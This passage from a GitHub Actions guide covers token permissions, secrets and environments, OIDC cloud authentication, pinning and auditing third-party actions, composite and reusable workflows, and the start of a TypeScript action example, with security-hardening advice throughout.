| `services:` | Declarative, managed by the runner, parallel startup | Config lives in YAML, not in your tests; no reuse locally | Simple, stable dependencies for one job |
| **Testcontainers** (library) | Same code runs locally and in CI; per-test isolation; programmatic control | Slower startup; needs a Docker socket | Java/Go/Node integration tests. **Usually the best choice for backend services** |
| `docker compose up` in a step | Mirrors your local dev setup exactly | Manual lifecycle and health waiting | You already have a compose file developers use |

🧠 For a Spring Boot service, Testcontainers plus `@ServiceConnection` is the modern answer: no `services:` block at all, and `mvn verify` behaves identically on a laptop and in CI. Hosted Linux runners have Docker available, so it just works.

---

## Chapter 17 — Permissions and `GITHUB_TOKEN`

### 17.1 What the token is

For every job, GitHub mints a short-lived installation token for the `github-actions[bot]` App, scoped to the repository. It is available as `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`, and it is automatically passed to the GitHub CLI when you set `GH_TOKEN`.

### 17.2 Declaring permissions

```yaml
permissions:
  contents: read              # workflow-wide default

jobs:
  publish:
    permissions:              # job-level OVERRIDES workflow-level entirely
      contents: read
      packages: write
      id-token: write
      attestations: write
    runs-on: ubuntu-24.04
```

⚠️ **Job-level `permissions` replaces the whole set, it does not merge.** If a job declares only `packages: write`, it has *no* `contents` access at all — and `actions/checkout` will fail.

### 17.3 The full scope list

| Scope | What `write` allows |
|---|---|
| `actions` | Manage workflow runs, download artifacts from other runs |
| `attestations` | Create build provenance attestations |
| `checks` | Create/update check runs and annotations |
| `contents` | Push commits, create tags and releases, read the repo |
| `deployments` | Create deployments and deployment statuses |
| `discussions` | Manage discussions |
| `id-token` | **Request an OIDC token.** Required for cloud federation |
| `issues` | Create/comment/label issues |
| `models` | Use GitHub Models |
| `packages` | Push to GitHub Packages / GHCR |
| `pages` | Deploy GitHub Pages |
| `pull-requests` | Create/comment/label PRs |
| `repository-projects` | Manage projects |
| `security-events` | **Upload SARIF** to code scanning |
| `statuses` | Set commit statuses |
| `vulnerability-alerts` | 📌 New in 2026: read-only access to Dependabot alerts |

Shorthands:

```yaml
permissions: read-all
permissions: write-all
permissions: {}          # no permissions at all — the safest default
```

### 17.4 The least-privilege recipe

Set `permissions: contents: read` at the top of **every** workflow, then grant extra scopes per job.

```yaml
permissions:
  contents: read

jobs:
  test:
    # inherits contents: read. Nothing else.

  codeql:
    permissions:
      contents: read
      security-events: write        # to upload SARIF
      actions: read

  comment:
    permissions:
      contents: read
      pull-requests: write          # to post a comment

  publish:
    permissions:
      contents: read
      packages: write               # to push to GHCR
      id-token: write               # for OIDC / attestations
      attestations: write

  release:
    permissions:
      contents: write               # to create a GitHub Release and push tags
```

🧠 Also set the **repository/organisation default** to read-only: Settings → Actions → General → Workflow permissions → "Read repository contents and packages permissions". This makes least privilege the default rather than something you must remember.

### 17.5 The `GITHUB_TOKEN` recursion guard

⚠️ **Events triggered by `GITHUB_TOKEN` do not trigger new workflow runs.** If a workflow pushes a commit using `GITHUB_TOKEN`, no `push` workflow fires for it.

This is deliberate — it prevents infinite loops. But it breaks legitimate patterns like "bot opens a release PR, CI must run on it".

Workarounds, in order of preference:

1. **A GitHub App token** (best). Create an App, install it on the repo, mint a token per run:
   ```yaml
   - uses: actions/create-github-app-token@v2
     id: app-token
     with:
       app-id: ${{ vars.BOT_APP_ID }}
       private-key: ${{ secrets.BOT_APP_PRIVATE_KEY }}
   - uses: actions/checkout@v7
     with:
       token: ${{ steps.app-token.outputs.token }}
   ```
   Scoped, short-lived, not tied to a person, auditable as the App.
2. **A fine-grained PAT** stored as a secret. Works, but expires, is tied to a human, and is a standing credential.
3. **Trigger the downstream workflow explicitly** via `workflow_dispatch` or `repository_dispatch` using the API.

### 17.6 When `GITHUB_TOKEN` is not enough

| Need | Solution |
|---|---|
| Access another repository | GitHub App token, or a fine-grained PAT with that repo's scope |
| Trigger downstream workflows | GitHub App token |
| Push to a protected branch | GitHub App added to the bypass list |
| Read org-level data | GitHub App with org permissions |
| Authenticate to AWS/GCP/Azure | **OIDC** (Chapter 19), never stored keys |
| Publish to npm/PyPI/Maven Central | Trusted publishing via OIDC where supported; otherwise a scoped token in an environment secret |

### 17.7 Using the token

```yaml
- name: Comment on the PR
  env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  run: |
    gh pr comment "${{ github.event.pull_request.number }}" \
      --body-file coverage-report.md
```

```yaml
- uses: actions/github-script@v9
  with:
    script: |
      await github.rest.issues.createComment({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: context.issue.number,
        body: 'Build finished ✅'
      });
```

`actions/github-script` gives you a pre-authenticated Octokit client and the run context — the fastest way to do anything API-shaped without writing a whole action.

---

## Chapter 18 — Secrets, Variables and Environments

### 18.1 The three levels of secrets

```mermaid
flowchart TD
    O["Organisation secrets<br/>shared across repos<br/>can be limited to selected repos"] --> R["Repository secrets<br/>available to all workflows in the repo"]
    R --> E["Environment secrets<br/>only available to jobs that<br/>declare environment: name<br/>+ gated by protection rules"]
```

Precedence when names collide: **environment > repository > organisation**.

🧠 **Put every production credential in an environment secret, never a repository secret.** A repository secret is available to any workflow, on any branch, run by anyone with write access. An environment secret is only released after the environment's protection rules are satisfied.

### 18.2 How masking works (and where it fails)

GitHub scans job logs and replaces exact matches of secret values with `***`.

It fails in these cases:

| Failure | Example |
|---|---|
| Transformed values | `echo "$SECRET" \| base64` — the encoded form is not masked |
| Partial values | Printing the first 8 characters |
| Multiline secrets | Only some lines may be registered |
| Structured output | A secret inside a JSON blob you print |
| Job outputs | ⚠️ **Job outputs are not masked at all** |
| Artifacts | Not scanned |
| Error messages from tools | A tool that echoes a URL containing a token |

Mask a derived value manually:

```yaml
- run: |
    TOKEN="$(./mint-token.sh)"
    echo "::add-mask::$TOKEN"
    echo "TOKEN=$TOKEN" >> "$GITHUB_ENV"
```

⚠️ Masking is a safety net, not a control. The real controls are: short-lived credentials (OIDC), least privilege, and environment scoping.

### 18.3 Environments — the deployment control plane

An environment is a named target (`staging`, `production`, `production-eu`) with its own secrets, variables, and **protection rules**.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-24.04
    environment:
      name: production
      url: https://api.example.com        # shown in the UI and on the deployment
    steps:
      - run: ./deploy.sh
```

**Protection rules available:**

| Rule | Effect |
|---|---|
| **Required reviewers** | Up to 6 users/teams must approve. The job waits, showing "Waiting for review" |
| **Wait timer** | Up to 30 days delay before the job starts. Used for bake time between canary and full rollout |
| **Deployment branches and tags** | Only specified refs may deploy to this environment. **Do this for production** |
| **Custom deployment protection rules** | A GitHub App can gate the deployment — e.g. "no deploys during a change freeze", "the ServiceNow ticket must be approved", "error budget must not be exhausted" |

```mermaid
stateDiagram-v2
    [*] --> Queued
    Queued --> WaitingApproval: environment has required reviewers
    Queued --> WaitingTimer: environment has a wait timer
    WaitingApproval --> Rejected: reviewer rejects
    WaitingApproval --> Running: reviewer approves
    WaitingTimer --> Running: timer elapses
    Queued --> Running: no protection rules
    Running --> Success
    Running --> Failure
    Rejected --> [*]
    Success --> [*]
    Failure --> [*]
```

📌 **New in 2026:** you can use an environment purely for its secrets and variables, without creating a GitHub Deployment record:

```yaml
    environment:
      name: shared-config
      deployment: false
```

Useful when you want scoped secrets for a non-deployment job (a nightly report that needs production read credentials) without polluting your deployment history. Note it is incompatible with custom deployment protection rules.

### 18.4 Environment design for a real system

| Environment | Branch policy | Reviewers | Wait timer | Secrets |
|---|---|---|---|---|
| `dev` | any branch | none | none | dev cluster creds |
| `staging` | `main` only | none | none | staging creds |
| `production` | `main` and `v*` tags | platform team (2) | none | prod OIDC role ARN |
| `production-canary` | `main` | none | none | prod creds |
| `production-full` | `main` | SRE on-call | 30 min bake | prod creds |

### 18.5 Secret hygiene checklist

- [ ] No long-lived cloud keys anywhere — use OIDC.
- [ ] Production credentials only in **environment** secrets, with branch restrictions.
- [ ] Organisation secrets limited to **selected repositories**, never "all repositories".
- [ ] Secret scanning and push protection enabled on the repo.
- [ ] Rotation schedule documented for anything that cannot be OIDC.
- [ ] `permissions:` declared explicitly in every workflow.
- [ ] Third-party actions pinned to a full commit SHA (§20.3) — an unpinned action can read every secret you pass to it.
- [ ] No secrets in job outputs, artifacts, or cache.
- [ ] Fork PR workflows never receive secrets.

---

## Chapter 19 — OIDC: Keyless Authentication to Cloud Providers

### 19.1 The problem with stored credentials

Storing `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` as repository secrets means: a long-lived credential, with standing permissions, sitting in a place that many people can read or exfiltrate, that nobody rotates.

OIDC replaces it with a token that is minted per job, lives for minutes, and is cryptographically bound to *which repository, which workflow, which branch or environment* requested it.

### 19.2 How it works

```mermaid
sequenceDiagram
    participant J as Job on runner
    participant GH as GitHub OIDC provider
    participant AWS as AWS STS
    participant S3 as AWS resources

    Note over J: permissions: id-token: write
    J->>GH: request OIDC token for audience "sts.amazonaws.com"
    GH-->>J: signed JWT with claims:<br/>sub = repo:org/repo:environment:production<br/>iss = https://token.actions.githubusercontent.com
    J->>AWS: AssumeRoleWithWebIdentity(JWT, roleArn)
    AWS->>GH: fetch JWKS, verify signature
    AWS->>AWS: match claims against role trust policy
    AWS-->>J: temporary credentials (15 min - 1 h)
    J->>S3: call AWS APIs
```

### 19.3 AWS setup

**One-time, in AWS:**

```hcl
resource "aws_iam_openid_connect_provider" "github" {
  url             = "https://token.actions.githubusercontent.com"
  client_id_list  = ["sts.amazonaws.com"]
  thumbprint_list = ["6938fd4d98bab03faadb97b34396831e3780aea1"]
}

resource "aws_iam_role" "deploy" {
  name = "github-actions-deploy"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Principal = { Federated = aws_iam_openid_connect_provider.github.arn }
      Action = "sts:AssumeRoleWithWebIdentity"
      Condition = {
        StringEquals = {
          "token.actions.githubusercontent.com:aud" = "sts.amazonaws.com"
          # Pin to the production ENVIRONMENT, not just the repo
          "token.actions.githubusercontent.com:sub" = "repo:my-org/my-service:environment:production"
        }
      }
    }]
  })
}
```

**In the workflow:**

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    environment: production
    runs-on: ubuntu-24.04
    steps:
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
          aws-region: ap-south-1
          role-session-name: gha-${{ github.run_id }}
      - run: aws sts get-caller-identity
      - run: aws ecs update-service --cluster prod --service api --force-new-deployment
```

### 19.4 The subject claim — get this right

`sub` is what your trust policy matches on. Its format depends on context:

| Context | `sub` value |
|---|---|
| Branch | `repo:ORG/REPO:ref:refs/heads/main` |
| Tag | `repo:ORG/REPO:ref:refs/tags/v1.0.0` |
| Pull request | `repo:ORG/REPO:pull_request` |
| Environment | `repo:ORG/REPO:environment:production` |
| Reusable workflow | depends on `job_workflow_ref` claim |

⚠️ **Never write a trust policy with `sub` = `repo:ORG/REPO:*`.** That lets *any* branch — including a branch an attacker pushed to a fork-and-PR, or any contributor's feature branch — assume your production role.

**Best practice: bind production roles to the `environment` claim.** Combined with environment protection rules (branch restrictions + required reviewers), you get defence in depth: the token cannot even be minted with that subject unless the job declares `environment: production`, and the job cannot start until the environment's rules pass.

Other claims you can condition on: `repository`, `repository_owner`, `job_workflow_ref` (excellent for locking a role to one specific reusable workflow), `workflow_ref`, `runner_environment` (`github-hosted` vs `self-hosted`), and 📌 **repository custom properties**, which became generally available in 2026 — you can define trust policies based on values like environment type, team ownership or compliance tier instead of enumerating repository names.

### 19.5 GCP and Azure

**GCP — Workload Identity Federation:**

```yaml
- uses: google-github-actions/auth@v3
  with:
    workload_identity_provider: projects/123/locations/global/workloadIdentityPools/github/providers/my-repo
    service_account: deployer@my-project.iam.gserviceaccount.com
- uses: google-github-actions/setup-gcloud@v2
- run: gcloud run deploy api --image ...
```

**Azure:**

```yaml
- uses: azure/login@v3
  with:
    client-id: ${{ vars.AZURE_CLIENT_ID }}
    tenant-id: ${{ vars.AZURE_TENANT_ID }}
    subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
```

Configure a federated credential on the App Registration with issuer `https://token.actions.githubusercontent.com` and subject matching your environment.

### 19.6 OIDC beyond the big three

- **HashiCorp Vault** — `hashicorp/vault-action` with the `jwt` auth method.
- **npm, PyPI, RubyGems, crates.io** — "trusted publishing" uses the same OIDC token. No API token needed at all.
- **Docker Hub, JFrog Artifactory, Sonatype Nexus** — OIDC support varies; check current docs.
- **Your own services** — verify the JWT against GitHub's JWKS endpoint and check the claims yourself. This is how you build an internal deployment API that only your pipelines can call.

Fetch the raw token yourself:

```yaml
- name: Get OIDC token
  run: |
    TOKEN="$(curl -sH "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=my-internal-api" | jq -r '.value')"
    echo "::add-mask::$TOKEN"
    curl -H "Authorization: Bearer $TOKEN" https://internal.example.com/deploy
```

---
# Part III — Building Blocks You Author

---

## Chapter 20 — Marketplace Actions: Choosing, Pinning, Auditing

### 20.1 What an action actually is

An action is **a Git repository (or a directory inside one) containing an `action.yml` file.** That is all. The Marketplace is a discovery layer on top; `uses:` resolves directly to a repo and ref.

```yaml
uses: owner/repo@ref              # repo root
uses: owner/repo/subdir@ref       # subdirectory
uses: ./.github/actions/mine      # local, no ref
uses: docker://ghcr.io/org/img:1  # a Docker image directly
```

Three implementation kinds (all identical to consume):

| Kind | Runs as | Startup | Cross-platform |
|---|---|---|---|
| **JavaScript/TypeScript** | Node on the runner | Fastest (~100 ms) | Yes |
| **Docker container** | A container | Slow (image pull/build) | Linux only |
| **Composite** | A sequence of steps | Fast | Depends on its steps |

### 20.2 Evaluating a third-party action

Every action you add is code that runs in your pipeline with access to your secrets and your token. Treat it like a production dependency.

Checklist before adopting:

- [ ] **Who maintains it?** `actions/*`, `github/*`, `docker/*`, `aws-actions/*`, `google-github-actions/*`, `azure/*`, `hashicorp/*` are vendor-maintained. Everything else is someone's side project until proven otherwise.
- [ ] **Recent commits and releases?** An action last touched three years ago probably runs a deprecated Node version.
- [ ] **Read the source.** Most useful actions are under 300 lines. For anything that touches secrets, actually read it.
- [ ] **What does it ask for?** An action that needs `contents: write` to lint your YAML is a red flag.
- [ ] **Does it phone home?** `grep` for network calls to domains other than `github.com`.
- [ ] **Could you replace it with five lines of `run:`?** Often yes. Fewer dependencies is better.

🧠 **The "just use the CLI" rule.** `aws-actions/configure-aws-credentials` earns its place (OIDC handshake is fiddly). An action that wraps `aws s3 sync` does not — `run: aws s3 sync` is clearer, faster, and has no supply chain risk.

### 20.3 Pinning — the single most important supply chain control

```yaml
# ❌ Mutable. The tag can be moved to any commit at any time.
- uses: some-org/some-action@v1

# ❌ Worse.
- uses: some-org/some-action@main

# ✅ Immutable. Pin to a full 40-character commit SHA.
- uses: some-org/some-action@a1b2c3d4e5f6789012345678901234567890abcd # v1.4.2
```

Why it matters: tags are mutable Git refs. A compromised maintainer account (or a malicious maintainer) can repoint `v1` at a commit that exfiltrates every secret in every workflow using it. This has happened repeatedly in the real world, most notably in the `tj-actions/changed-files` incident, where a moved tag caused thousands of repositories to dump secrets into their logs.

**The policy:**

| Action source | Pin to |
|---|---|
| `actions/*`, `github/*` (first-party) | Major tag (`@v7`) is acceptable |
| Cloud vendors (`aws-actions`, `google-github-actions`, `azure`, `docker`) | Major tag acceptable, SHA preferred |
| **Everything else** | **Full commit SHA, always** |

Always put the human-readable version in a trailing comment, so Dependabot can update it and humans can read it.

**Automate it.** Dependabot understands SHA pins and will raise PRs that bump both the SHA and the comment:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: "/"
    schedule: { interval: weekly }
    groups:
      actions-minor:
        update-types: [minor, patch]
```

Tools like `pin-github-action` and `ratchet` can convert an existing repo's tags to SHAs in bulk.

📌 **Immutable actions.** GitHub has been rolling out immutable action releases, where a published release is bound to an immutable artifact rather than a movable tag. Where available, this removes most of the tag-mutation risk. Until it is universal, pin SHAs.

### 20.4 Restricting which actions may run

Organisation or repository → Settings → Actions → General → Actions permissions:

- Allow all actions (default; too permissive for production orgs)
- Allow local actions only
- Allow local + **selected** actions, with an explicit allowlist:

```
actions/*,
github/*,
docker/*,
aws-actions/configure-aws-credentials@*,
step-security/harden-runner@*,
```

Also available: "Require actions to be pinned to a full-length commit SHA" — turn this on.

### 20.5 The actions you will actually use

| Action | Purpose |
|---|---|
| `actions/checkout@v7` | Clone the repo |
| `actions/setup-java@v6` / `setup-go@v7` / `setup-node@v7` / `setup-python@v7` | Toolchains |
| `actions/cache@v6` | Caching |
| `actions/upload-artifact@v7` / `download-artifact@v8` | Artifacts |
| `actions/github-script@v9` | Inline Octokit scripting |
| `actions/attest-build-provenance@v4` | SLSA provenance |
| `actions/create-github-app-token@v2` | Mint an App token |
| `docker/setup-buildx-action@v4`, `docker/build-push-action@v7`, `docker/login-action@v4`, `docker/metadata-action@v6` | Container builds |
| `github/codeql-action@v4` | SAST |
| `aws-actions/configure-aws-credentials@v6` | AWS OIDC |
| `google-github-actions/auth@v3`, `azure/login@v3` | GCP / Azure OIDC |
| `hashicorp/setup-terraform@v4` | Terraform |
| `sigstore/cosign-installer@v4` | Image signing |
| `aquasecurity/trivy-action` | Vulnerability scanning |
| `anchore/sbom-action` | SBOM generation |
| `dorny/paths-filter@v4` | Change detection for monorepos |
| `peter-evans/create-pull-request@v8` | Bot PRs |
| `softprops/action-gh-release@v3` | GitHub Releases |
| `step-security/harden-runner@v2` | Egress filtering and runtime monitoring |
| `slackapi/slack-github-action@v4` | Slack notifications |
| `gradle/actions/setup-gradle@v6` | Gradle with smart caching |
| `codecov/codecov-action@v7` | Coverage upload |

### 20.6 `actions/checkout` in depth

You will use this in every workflow; know its options.

```yaml
- uses: actions/checkout@v7
  with:
    repository: ''                 # default: current repo
    ref: ''                        # default: the triggering SHA
    token: ${{ github.token }}     # override for cross-repo or to trigger downstream workflows
    ssh-key: ''                    # for submodules over SSH
    persist-credentials: true      # leaves the token in git config for later git commands
    fetch-depth: 1                 # 0 = full history
    fetch-tags: false
    submodules: false              # true | recursive
    lfs: false
    clean: true
    sparse-checkout: |             # partial checkout for big monorepos
      services/api
      libs/common
    path: ''                       # check out into a subdirectory
```

Key decisions:

- **`fetch-depth: 0`** is required for anything that reads history: `git describe`, changelog generation, SonarQube blame, diff-against-base. Otherwise keep the default shallow clone — it is much faster on big repos.
- **`persist-credentials: false`** if your job runs untrusted code — otherwise the token sits in `.git/config` where any script can read it.
- **Multiple checkouts** into different `path:` values when you need another repo:
  ```yaml
  - uses: actions/checkout@v7
    with: { path: app }
  - uses: actions/checkout@v7
    with:
      repository: my-org/deploy-config
      token: ${{ steps.app-token.outputs.token }}
      path: config
  ```

---

## Chapter 21 — Composite Actions

### 21.1 What they are

A composite action bundles a sequence of steps into a reusable unit that you invoke with `uses:`. It runs **inside the caller's job**, on the caller's runner, sharing the same filesystem.

### 21.2 A real example

```yaml
# .github/actions/setup-java-build/action.yml
name: 'Set up Java build environment'
description: 'Installs the JDK, configures Maven caching and authentication'

inputs:
  java-version:
    description: 'JDK version'
    required: false
    default: '21'
  distribution:
    description: 'JDK distribution'
    required: false
    default: 'temurin'
  registry-token:
    description: 'Token for the internal Maven registry'
    required: false
    default: ''

outputs:
  java-home:
    description: 'Resolved JAVA_HOME'
    value: ${{ steps.setup.outputs.path }}
  cache-hit:
    description: 'Whether the dependency cache was an exact hit'
    value: ${{ steps.cache.outputs.cache-hit }}

runs:
  using: composite
  steps:
    - id: setup
      uses: actions/setup-java@v6
      with:
        distribution: ${{ inputs.distribution }}
        java-version: ${{ inputs.java-version }}

    - id: cache
      uses: actions/cache@v6
      with:
        path: ~/.m2/repository
        key: ${{ runner.os }}-m2-${{ inputs.java-version }}-${{ hashFiles('**/pom.xml') }}
        restore-keys: |
          ${{ runner.os }}-m2-${{ inputs.java-version }}-
          ${{ runner.os }}-m2-

    - name: Configure Maven settings
      if: inputs.registry-token != ''
      shell: bash
      env:
        REGISTRY_TOKEN: ${{ inputs.registry-token }}
      run: |
        mkdir -p ~/.m2
        cat > ~/.m2/settings.xml <<'XML'
        <settings>
          <servers>
            <server>
              <id>internal</id>
              <username>ci</username>
              <password>${env.REGISTRY_TOKEN}</password>
            </server>
          </servers>
        </settings>
        XML

    - name: Print environment
      shell: bash
      run: |
        java -version
        mvn -version
```

Used as:

```yaml
- uses: ./.github/actions/setup-java-build
  with:
    java-version: '21'
    registry-token: ${{ secrets.INTERNAL_MAVEN_TOKEN }}
```

### 21.3 Rules and gotchas

1. ⚠️ **Every `run:` step must declare `shell:`.** There is no default inside a composite action. This is the number one error.
2. ⚠️ **`secrets` is not available.** A composite action cannot read `secrets.FOO`. Pass secrets in as inputs.
3. ⚠️ **`env:` at the action level is not supported** in older runner versions; set env per step.
4. **Inputs are accessed as `inputs.name`**, not `github.event.inputs.name`.
5. **`$GITHUB_ACTION_PATH`** points at the action's own directory. Use it to reference bundled scripts:
   ```yaml
   - shell: bash
     run: "$GITHUB_ACTION_PATH/scripts/validate.sh"
   ```
6. **`if:` works on composite steps** and can reference `inputs`.
7. **Composite actions can call other actions**, including other composite actions (nesting is allowed).
8. ⚠️ **Step outputs are not automatically exposed.** You must declare them in the `outputs:` block, referencing the inner step id.

### 21.4 Where to put them

| Location | `uses:` | Use when |
|---|---|---|
| `./.github/actions/name/` | `./.github/actions/name` | Used only in this repo |
| A dedicated `my-org/actions` repo | `my-org/actions/setup-java@v2` | Shared across the org |
| Its own repo | `my-org/setup-java-action@v2` | Published publicly |

⚠️ A local action (`./...`) requires `actions/checkout` to have run **first**, in the same job.

---

## Chapter 22 — Reusable Workflows

### 22.1 Composite action vs reusable workflow

This is the decision people get wrong most often.

```mermaid
flowchart TD
    Q{"What are you reusing?"} --> A["A sequence of STEPS<br/>inside one job"]
    Q --> B["One or more whole JOBS<br/>with their own runners"]
    A --> CA["COMPOSITE ACTION<br/>uses: ./.github/actions/x<br/>Runs on caller's runner<br/>No secrets, no runs-on,<br/>no matrix, no environment"]
    B --> RW["REUSABLE WORKFLOW<br/>uses: org/repo/.github/workflows/x.yml@v1<br/>Own runners, own matrix,<br/>own environment, own permissions,<br/>secrets passed or inherited"]
```

| | Composite action | Reusable workflow |
|---|---|---|
| Granularity | Steps | Jobs |
| Called from | A `steps:` list | A `jobs:` entry |
| Own runner | No — uses caller's | Yes |
| Can set `runs-on` | No | Yes |
| Can use a matrix | No | Yes |
| Can use `environment:` | No | Yes |
| Can use `services:` | No | Yes |
| Access `secrets` | No (pass as inputs) | Yes (`secrets:` or `inherit`) |
| Nesting depth | Effectively unlimited | Max 4 levels |
| Shown as separate job in UI | No | Yes |

🧠 **Rule of thumb:** "set up my build environment" → composite action. "run our standard Java CI pipeline" → reusable workflow.

### 22.2 Defining one

```yaml
# .github/workflows/reusable-java-ci.yml
name: Reusable Java CI

on:
  workflow_call:
    inputs:
      java-version:
        description: 'JDK version'
        required: false
        type: string
        default: '21'
      module:
        description: 'Maven module to build, or empty for all'
        required: false
        type: string
        default: ''
      run-integration-tests:
        required: false
        type: boolean
        default: true
      runner:
        required: false
        type: string
        default: 'ubuntu-24.04'
    secrets:
      SONAR_TOKEN:
        required: false
      INTERNAL_MAVEN_TOKEN:
        required: true
    outputs:
      version:
        description: 'The resolved project version'
        value: ${{ jobs.build.outputs.version }}
      coverage:
        description: 'Line coverage percentage'
        value: ${{ jobs.build.outputs.coverage }}

permissions:
  contents: read

jobs:
  build:
    runs-on: ${{ inputs.runner }}
    timeout-minutes: 30
    outputs:
      version: ${{ steps.meta.outputs.version }}
      coverage: ${{ steps.cov.outputs.pct }}
    services:
      postgres:
        image: postgres:17
        env: { POSTGRES_PASSWORD: test, POSTGRES_DB: test }
        ports: ['5432:5432']
        options: >-
          --health-cmd "pg_isready" --health-interval 10s --health-retries 10
    steps:
      - uses: actions/checkout@v7

      - uses: ./.github/actions/setup-java-build
        with:
          java-version: ${{ inputs.java-version }}
          registry-token: ${{ secrets.INTERNAL_MAVEN_TOKEN }}

      - id: meta
        run: |
          V="$(mvn -B -q help:evaluate -Dexpression=project.version -DforceStdout)"
          echo "version=$V" >> "$GITHUB_OUTPUT"

      - name: Unit tests
        run: mvn -B -ntp ${{ inputs.module && format('-pl {0} -am', inputs.module) || '' }} test

      - name: Integration tests
        if: inputs.run-integration-tests
        run: mvn -B -ntp verify -Pintegration-tests

      - id: cov
        run: |
          PCT="$(python3 scripts/jacoco_pct.py target/site/jacoco/jacoco.xml)"
          echo "pct=$PCT" >> "$GITHUB_OUTPUT"

      - name: SonarQube
        if: ${{ secrets.SONAR_TOKEN != '' }}
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
        run: mvn -B sonar:sonar

      - if: always()
        uses: actions/upload-artifact@v7
        with:
          name: reports-${{ inputs.java-version }}
          path: '**/target/*-reports/**'
          if-no-files-found: ignore
```

### 22.3 Calling one

```yaml
# .github/workflows/ci.yml
name: CI
on:
  pull_request:
  push: { branches: [main] }

permissions:
  contents: read

jobs:
  ci:
    uses: my-org/shared-workflows/.github/workflows/reusable-java-ci.yml@v2
    with:
      java-version: '21'
      run-integration-tests: ${{ github.event_name == 'push' }}
    secrets:
      INTERNAL_MAVEN_TOKEN: ${{ secrets.INTERNAL_MAVEN_TOKEN }}
      SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}

  report:
    needs: ci
    runs-on: ubuntu-24.04
    steps:
      - run: echo "Built version ${{ needs.ci.outputs.version }} at ${{ needs.ci.outputs.coverage }}% coverage"
```

Key syntax points:
- `uses:` sits at the **job** level, not inside `steps:`.
- A job that calls a reusable workflow **cannot have `steps:`, `runs-on:`, or most other job keys**. Only `with`, `secrets`, `needs`, `if`, `permissions`, `strategy`, `concurrency`.
- The ref (`@v2`) is mandatory for remote workflows. Use `@.github/workflows/x.yml` relative paths only within the same repo: `uses: ./.github/workflows/x.yml`.

### 22.4 `secrets: inherit`

```yaml
  ci:
    uses: my-org/shared/.github/workflows/build.yml@v2
    secrets: inherit
```

Passes **every** secret available to the caller. Convenient, and a blunt instrument. Use explicit secret passing when the called workflow lives in a different repository or is maintained by another team.

### 22.5 Matrix over a reusable workflow

```yaml
jobs:
  build:
    strategy:
      fail-fast: false
      matrix:
        service: [api, worker, scheduler]
    uses: ./.github/workflows/reusable-service-ci.yml
    with:
      service: ${{ matrix.service }}
    secrets: inherit
```

This is the monorepo workhorse: one reusable pipeline, fanned out over N services.

### 22.6 Limits and gotchas

| Limit | Value |
|---|---|
| Nesting depth | 4 (caller → A → B → C) |
| Reusable workflows per workflow file | 20 |
| Can a reusable workflow call itself? | No |
| Can it be in a private repo? | Yes, if the calling repo has access (org setting) |
| Does `env:` from the caller propagate? | **No.** Pass as inputs |
| Does `defaults:` propagate? | **No** |
| Are caller's `permissions:` inherited? | The called workflow can only **narrow**, never expand |

⚠️ **The `env` non-propagation trips everyone.** A reusable workflow sees none of the caller's `env:` block. Everything must be an explicit input.

⚠️ **Version your reusable workflows.** Calling `@main` means every downstream repo breaks the moment you make a breaking change. Tag releases (`v1`, `v1.2.0`) and move the major tag deliberately.

### 22.7 `job_workflow_ref` and OIDC

When a reusable workflow performs a deployment, the OIDC token includes a `job_workflow_ref` claim identifying the reusable workflow. You can write a cloud trust policy that says "only our blessed deploy workflow may assume this role, regardless of which repository calls it":

```json
"token.actions.githubusercontent.com:job_workflow_ref":
  "my-org/shared-workflows/.github/workflows/deploy.yml@refs/tags/v2"
```

🧠 This is the cleanest way to run a **paved road**: teams call your deploy workflow, the cloud role trusts only that workflow, and nobody can hand-roll a deploy that assumes the production role.

---

## Chapter 23 — JavaScript / TypeScript Actions

### 23.1 When to write one

Write a JS action when you need: real logic (loops, error handling, parsing), API calls, retries, or cross-platform behaviour that would be painful in bash. Otherwise prefer composite.

### 23.2 Structure

```
my-action/
├── action.yml
├── package.json
├── tsconfig.json
├── src/
│   ├── main.ts
│   └── post.ts
└── dist/
    ├── index.js        # committed, bundled
    └── post/index.js
```

```yaml
# action.yml
name: 'Wait for deployment'
description: 'Polls a health endpoint until the deployment is live'
author: 'my-org'
branding:
  icon: 'activity'
  color: 'blue'

inputs:
  url:
    description: 'Health endpoint URL'
    required: true
  expected-version:
    description: 'Version string that must appear in the response'
    required: true
  timeout-seconds:
    description: 'Give up after this many seconds'
    required: false
    default: '300'

outputs:
  duration-seconds:
    description: 'How long it took to become healthy'

runs:
  using: 'node24'
  main: 'dist/index.js'
  post: 'dist/post/index.js'
  post-if: 'always()'
```

📌 **Node runtime:** Node 20 has been removed from runners; actions must declare `node24`. If you maintain actions, `using: node24` is now the required value.

### 23.3 The toolkit

```typescript
// src/main.ts
import * as core from '@actions/core';
import * as github from '@actions/github';
import * as exec from '@actions/exec';

async function run(): Promise<void> {
  try {
    const url = core.getInput('url', { required: true });
    const expected = core.getInput('expected-version', { required: true });
    const timeout = parseInt(core.getInput('timeout-seconds'), 10);

    core.info(`Polling ${url} for version ${expected}`);
    const started = Date.now();

    while ((Date.now() - started) / 1000 < timeout) {
      try {
        const res = await fetch(url, { signal: AbortSignal.timeout(5000) });
        if (res.ok) {
          const body = await res.json() as { version?: string };
          if (body.version === expected) {
            const secs = Math.round((Date.now() - started) / 1000);
            core.setOutput('duration-seconds', secs.toString());
            await core.summary
              .addHeading('Deployment healthy')
              .addTable([
                [{ data: 'Field', header: true }, { data: 'Value', header: true }],
                ['URL', url],
                ['Version', expected],
                ['Time to healthy', `${secs}s`],
              ])
              .write();
            return;
          }
          core.debug(`Saw version ${body.version}, waiting for ${expected}`);
        }
      } catch (e) {
        core.debug(`Poll failed: ${(e as Error).message}`);
      }
      await new Promise(r => setTimeout(r, 5000));
    }

